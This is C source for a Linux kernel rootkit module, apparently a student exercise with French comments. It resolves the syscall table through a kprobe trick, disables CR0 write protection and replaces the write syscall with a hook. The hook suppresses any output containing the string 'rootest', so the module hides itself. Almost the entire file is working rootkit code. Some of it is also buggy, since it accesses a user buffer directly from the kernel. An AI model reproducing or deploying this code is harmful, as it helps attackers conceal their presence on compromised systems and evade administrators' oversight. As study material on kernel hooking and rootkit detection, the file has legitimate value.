#include "rootest.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("2600 student");
MODULE_DESCRIPTION("HOOKING SYSCALL TABLE");
MODULE_VERSION("0.01");

unsigned long * __sys_call_table;

/* pour régler de le kallsyms_lookup_name pas défini (désactivé par sécurité) */
struct kprobe kp_kln = {
    .symbol_name = "kallsyms_lookup_name"
};

typedef asmlinkage long (*orig_write_t)(struct pt_regs *);
orig_write_t orig_write;

asmlinkage int hook_write(struct pt_regs *regs)
{
    /* récupérer les paramètres de write depuis les registres */
    int *fd = (int *)regs->di;
    char __user *buf = (char *)regs->si;
    int *count = (int *)regs->dx;
        
    /* Regarde si le pattern existe dans le buffer */
    char *pattern = "rootest";
    char *pos = strstr(buf, pattern);
    
    //printk(KERN_INFO "rootkit: fd %d\n", fd);
    //printk(KERN_INFO "rootkit: buf 0x%lx\n", buf);
    //printk(KERN_INFO "rootkit: count %d\n", count);
    //printk(KERN_INFO "rootkit: pattern %s\n", pattern);
    //printk(KERN_INFO "rootkit: buf_char %s\n", buf);
    
    if (pos != NULL) {
        //char *k_buf = (char*)kmalloc(count,GFP_KERNEL);
	//memset(k_buf,0,count);
	//copy_to_user(regs->di,k_buf,count);
        //kfree(k_buf);
 	//asm volatile("xorq %%rsi, %%rsi" : : );
	//clear_user((char __user *)buf, count);
        //copy_to_user((void __user *)buf, 0, count);
        memset(regs->si, 0, count);
        //regs->si = 0;
        regs->dx = 0;
    }
    
    /* appel du vrai sys_call write avec les nouveaux arguments */
    return orig_write(regs);
}

/* la fonction normale write_cr0() empêche par sécurité de modifier le WriteProtect Bit */
inline void cr0_write(unsigned long cr0)
{	
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/* le bit n°16 dans le registre cr0 détermine la protection des pages */
inline void protect_memory(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    cr0_write(cr0);
}

inline void unprotect_memory(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    cr0_write(cr0);
}

int __init rootkit_init_hook(void)
{
    /* pour régler de le kallsyms_lookup_name pas défini (déactivé par sécurité) */
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp_kln);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp_kln.addr;
    unregister_kprobe(&kp_kln);
    
    
    __sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

    /* récupération du pointeur sur le vrai syscall */
    orig_write = (orig_write_t)__sys_call_table[__NR_write];

    printk(KERN_INFO "rootkit: syscall table à 0x%lx\n", __sys_call_table);
    printk(KERN_INFO "rootkit: write syscall à 0x%lx\n", orig_write);
    
    unprotect_memory();

    /* changement du pointeur de sys_write vers le hook */
    __sys_call_table[__NR_write] = (unsigned long)hook_write;

    protect_memory();

    return 0;
}

void __exit rootkit_exit_hook(void)
{
    unprotect_memory();
    
    printk(KERN_INFO "rootkit: restauration write syscall\n");
    __sys_call_table[__NR_write] = (unsigned long)orig_write;
    
    protect_memory();
}
